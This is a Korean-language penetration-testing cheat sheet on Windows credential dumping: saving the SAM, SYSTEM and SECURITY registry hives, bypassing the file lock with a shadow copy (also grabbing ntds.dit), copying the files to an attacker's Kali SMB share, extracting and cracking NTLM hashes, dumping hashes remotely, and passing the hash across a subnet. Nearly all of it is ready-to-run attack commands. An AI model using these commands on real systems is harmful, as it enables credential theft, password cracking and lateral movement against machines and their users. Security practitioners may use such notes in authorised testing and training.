# 08_SAM_SYSTEM_덤프

# 윈도우 권한상승 — SAM/SYSTEM 덤프

로컬 사용자 NTLM 해시 추출. 로컬 관리자 권한 또는 SeBackupPrivilege 필요.

---

## 원리 — 세 하이브의 역할과 접근 제한

```
1) SAM      : 로컬 계정 NTLM 해시 보관 (암호화된 상태, 단독으로는 해독 불가)
2) SYSTEM   : SAM 복호화용 부트키(syskey) 보관 — 이 키 없으면 SAM 덤프해도 해석 불가
3) SECURITY : LSA Secrets 보관 (캐시된 도메인 로그온, 서비스 계정 평문 비번 등)
```

세 하이브 중 하나라도 빠지면 완전한 크리덴셜 복원이 안 된다. Windows는 부팅 중 SAM 파일에 커널 레벨 잠금을 걸어서 관리자도 `copy`로는 못 가져간다. `reg save`는 파일 복사가 아니라 레지스트리 API를 통한 논리적 export라서 이 잠금을 우회하는 정식 경로다 (SYSTEM 또는 SeBackupPrivilege 권한 필요).

---

## 레지스트리에서 직접 저장

```bash
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
reg save HKLM\SECURITY C:\Temp\security.hive
```

---

## Volume Shadow Copy (복사 제한 우회)

파일 잠금은 살아있는 파일에만 걸린다. VSS로 그 순간의 스냅샷을 뜨면, 스냅샷은 잠금 없는 별개 파일이라 그냥 복사된다 (2021년 HiveNightmare/SeriousSAM 취약점이 이 원리로 일반 사용자 권한만으로 SAM 덤프가 가능함을 보여준 사례).

```bash
:: VSS 생성
vssadmin create shadow /for=C:

:: 경로에서 복사(출력된 Shadow Device Name 사용)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\
```

---

## 칼리로 전송 후 파싱

```bash
# SMB 공유로 전송
impacket-smbserver share /tmp/loot -smb2support
```

```bash
copy C:\Temp\sam.hive \\<칼리IP>\share\
copy C:\Temp\system.hive \\<칼리IP>\share\
```

```bash
# 해시 추출
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL

# 크랙
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 원격 덤프 (관리자 자격증명 확보 후)

```bash
impacket-secretsdump corp.local/Administrator:'Password!'@<IP>
impacket-secretsdump -hashes :<NTLM> Administrator@<IP>

# netexec
nxc smb <IP> -u Administrator -p 'Password!' --sam
nxc smb <IP> -u Administrator -p 'Password!' --lsa
```

---

## 해시로 PtH

```bash
impacket-psexec -hashes :<NTLM> Administrator@<IP>
evil-winrm -i <IP> -u Administrator -H <NTLM>
nxc smb <서브넷>/24 -u Administrator -H <NTLM> --local-auth
```